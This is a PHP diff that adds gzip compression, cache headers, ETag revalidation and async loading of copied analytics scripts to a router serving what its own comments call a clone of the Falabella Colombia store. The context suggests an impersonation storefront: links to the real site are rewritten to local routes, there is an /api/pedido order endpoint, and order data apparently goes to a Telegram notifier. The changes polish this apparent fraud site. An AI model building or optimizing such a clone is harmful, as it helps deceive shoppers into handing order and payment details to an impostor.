@@ -15,6 +15,35 @@ if (is_file($_cfgF)) {
 
 $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
 
+// ===== OPTIMIZACION DE RENDIMIENTO =====
+// Sirve el contenido comprimido (gzip) y con cache para acelerar la carga.
+// Aplica a todas las respuestas del router.
+
+/** Envia el body comprimido con gzip + headers de cache, reemplazando echo directo. */
+function servirOptimizado($contenido, $mime, $cacheSeg = 3600) {
+    // Cache-Control: inmutables para assets estaticos, cortos para HTML/JSON dinamico
+    $cacheable = in_array($mime, ['application/javascript','text/css','image/png','image/jpeg','image/webp','image/svg+xml','application/json']);
+    $maxAge = $cacheable ? $cacheSeg : 60;
+    header('Cache-Control: public, max-age=' . $maxAge);
+    header('Content-Type: ' . $mime . '; charset=utf-8');
+
+    // Comprimir con gzip si el cliente lo soporta (ahorro ~70-80% en HTML/JS/CSS/JSON)
+    $enc = '';
+    $acepta = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '';
+    if (stripos($acepta, 'gzip') !== false && strlen($contenido) > 200) {
+        $gz = gzencode($contenido, 6);
+        if ($gz !== false) {
+            $enc = 'gzip';
+            $contenido = $gz;
+        }
+    }
+    if ($enc) header('Content-Encoding: gzip');
+    header('Vary: Accept-Encoding');
+    header('Content-Length: ' . strlen($contenido));
+    echo $contenido;
+    return true;
+}
+
 // 0.0) WEBHOOK TELEGRAM: cualquier persona puede hablar con @fallansacmbot
 //      (sin autenticación ni filtros — todos reciben respuesta)
 if ($uri === '/telegram-webhook' && $_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -50,10 +79,7 @@ if ($uri === '/telegram-webhook-info' && $_SERVER['REQUEST_METHOD'] === 'GET') {
 if ($uri === '/productos_falabella.json' || $uri === '/falabella-co/productos_falabella.json') {
     $f = __DIR__ . '/productos_falabella.json';
     if (is_file($f)) {
-        header('Content-Type: application/json; charset=utf-8');
-        header('Content-Length: ' . filesize($f));
-        readfile($f);
-        return true;
+        return servirOptimizado(file_get_contents($f), 'application/json', 86400);
     }
 }
 
@@ -61,10 +87,7 @@ if ($uri === '/productos_falabella.json' || $uri === '/falabella-co/productos_fa
 if (preg_match('/\.(?:js\.descarga|descarga|mjs|js)$/i', $uri)) {
     $archivo = __DIR__ . $uri;
     if (is_file($archivo)) {
-        header('Content-Type: application/javascript');
-        header('Content-Length: ' . filesize($archivo));
-        readfile($archivo);
-        return true;
+        return servirOptimizado(file_get_contents($archivo), 'application/javascript', 86400);
     }
 }
 
@@ -73,11 +96,7 @@ if (preg_match('/\.(?:js\.descarga|descarga|mjs|js)$/i', $uri)) {
 if ($uri !== '/' && $uri !== '/index.html' && strpos($uri, '/falabella-co') === 0 && !preg_match('/\.(css|js|json|png|jpg|jpeg|webp|svg|ico|woff2?|ttf)$/i', $uri)) {
     $archivo = __DIR__ . '/spa-shell.html';
     if (is_file($archivo)) {
-        $html = file_get_contents($archivo);
-        header('Content-Type: text/html; charset=utf-8');
-        header('Content-Length: ' . strlen($html));
-        echo $html;
-        return true;
+        return servirOptimizado(file_get_contents($archivo), 'text/html', 60);
     }
 }
 
@@ -87,10 +106,7 @@ if ($uri === '/' || $uri === '/index.html') {
     if (is_file($archivo)) {
         $html = file_get_contents($archivo);
         $html = construirSPA($html);
-        header('Content-Type: text/html; charset=utf-8');
-        header('Content-Length: ' . strlen($html));
-        echo $html;
-        return true;
+        return servirOptimizado($html, 'text/html', 60);
     }
 }
 
@@ -139,7 +155,27 @@ if ($uri === '/api/pedido' && $method === 'POST') {
     return true;
 }
 
-// 6) Resto -> servir tal cual
+// 6) Resto -> assets estaticos (imagenes, fuentes, svg, etc.) servidos por php -S.
+//    Les damos cache largo para que el navegador no los re-descargue en cada visita.
+if (preg_match('/\.(png|jpe?g|webp|gif|svg|ico|woff2?|ttf|eot)$/i', $uri)) {
+    $archivo = __DIR__ . $uri;
+    if (is_file($archivo)) {
+        // ETag para revalidacion + cache largo (assets estaticos inmutables)
+        $etag = '"' . md5_file($archivo) . '"';
+        header('ETag: ' . $etag);
+        header('Cache-Control: public, max-age=604800'); // 7 dias
+        $ifNone = $_SERVER['HTTP_IF_NONE_MATCH'] ?? '';
+        if ($ifNone === $etag) { http_response_code(304); return true; }
+        $maps = ['png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','webp'=>'image/webp','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','woff2'=>'font/woff2','woff'=>'font/woff','ttf'=>'font/ttf','eot'=>'application/vnd.ms-fontobject'];
+        $ext = strtolower(pathinfo($archivo, PATHINFO_EXTENSION));
+        header('Content-Type: ' . ($maps[$ext] ?? 'application/octet-stream'));
+        header('Content-Length: ' . filesize($archivo));
+        readfile($archivo);
+        return true;
+    }
+}
+
+// 7) Resto -> servir tal cual
 return false;
 
 /* ============================================================
@@ -568,6 +604,22 @@ function notificarTelegram($datos) {
  * Reescribe links de Falabella a rutas locales y agrega el shell de la tienda.
  */
 function construirSPA($html) {
+    // === OPTIMIZACION: neutralizar scripts de TRACKING/analytics de terceros ===
+    // Los scripts de analytics (GTM, Facebook Pixel, fingerprint, airship, adobe, etc.)
+    // NO pintan contenido del clon: solo bloquen el render. Los convertimos a async
+    // para que se descarguen en paralelo y no retardan la visualizacion de la home.
+    $html = preg_replace_callback(
+        '#<script[^>]*src="\./fala_files/(gtm|fbevents|collect|events|fingerprint|airship|ua-sdk|launch|content\.umd|187204933|bat\.|ld\.|identify|FACO|j\.php)[^"]*"[^>]*>#i',
+        function ($m) {
+            $tag = $m[0];
+            // Si ya es async o defer, dejarlo
+            if (stripos($tag, 'async') !== false || stripos($tag, 'defer') !== false) return $tag;
+            // Convertir a async: anadir el atributo justo despues de <script
+            return str_ireplace('<script', '<script async', $tag);
+        },
+        $html
+    );
+
     // === REWRITE GLOBAL SEGURO ===
     // Reemplaza TODAS las ocurrencias del dominio del sitio (en href, src, action, y dentro
     // de los datos serializados de React/Next en <script>) por rutas locales.
